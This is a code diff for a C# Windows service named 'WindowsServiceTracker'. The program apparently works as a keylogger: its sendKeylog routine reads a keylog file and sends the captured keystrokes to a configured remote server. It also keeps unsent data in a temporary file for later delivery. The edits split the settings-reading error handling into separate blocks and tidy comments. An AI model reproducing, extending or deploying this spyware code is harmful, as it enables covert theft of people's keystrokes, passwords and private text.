@@ -98,8 +98,7 @@ namespace WindowsServiceTracker
             //to the process.
             //System.Diagnostics.Debugger.Launch();
 
-            //Keep the service running for 15 seconds
-            //Thread.Sleep(30000); //todo remove for final release
+            //Thread.Sleep(30000); //uncomment if you need to connect to debug before the service starts
 
             //Sets the current directory to where the WindowsServiceTracker.exe is located rather
             //than some Windows folder that I couldn't seem to locate
@@ -112,13 +111,23 @@ namespace WindowsServiceTracker
             try
             {
                 ipAddressString = Properties.Settings.Default.ServerIP;
+            }
+            catch (Exception e)
+            { }
+
+            try
+            {
                 port = Convert.ToInt32(Properties.Settings.Default.ServerPort);
+            }
+            catch (Exception e)
+            { }
+
+            try
+            {
                 domainName = Properties.Settings.Default.ServerDomain;
             }
-            catch (ConfigurationException e)
-            {}
             catch (Exception e)
-            {}
+            { }
 
             // get list of IPs from domain name
             if (domainName.Length > 0)
@@ -623,11 +632,7 @@ namespace WindowsServiceTracker
             {
                 log = new StreamReader(tempFile);
 
-                // the nested try block is so that when there is no keylog file,
-                // it still sends the opcode and newline char
-                // previous comment changed. not sending messages if there
-                // is nothing to send
-                //todo revisit the nested try blocks reguarding the change
+                // send keylog data from file
                 try
                 {
                     bool lastSendSuccessful = true;
@@ -640,7 +645,7 @@ namespace WindowsServiceTracker
                             lastSendSuccessful = SendStdMsg(KEYLOG, msg, true);
                             Thread.Sleep(1000);
                         }
-                        else // change noted above
+                        else
                         {
                             lastSendSuccessful = true;
                         }
@@ -650,6 +655,8 @@ namespace WindowsServiceTracker
                 catch (Exception)
                 { }
 
+                //if for some reason interrupted while sending, store the remaining content
+                //in a temporary file to be sent later
                 if (!sentAllContent)
                 {
                     try
@@ -677,10 +684,11 @@ namespace WindowsServiceTracker
                 File.Delete(tempFile);
                 if (successfulFileOpen && sentAllContent)
                 {
-                    // if we sent an old file, send new one now
+                    // if we sent an old, stored file, send new one now
+                    // by recursively calling sendKeylog
                     if (storedFileExists && sentAllContent)
                     {
-                        return sendKeylog(); //todo recursion on huge keylog could be a problem
+                        return sendKeylog();
                     }
                 }
             }
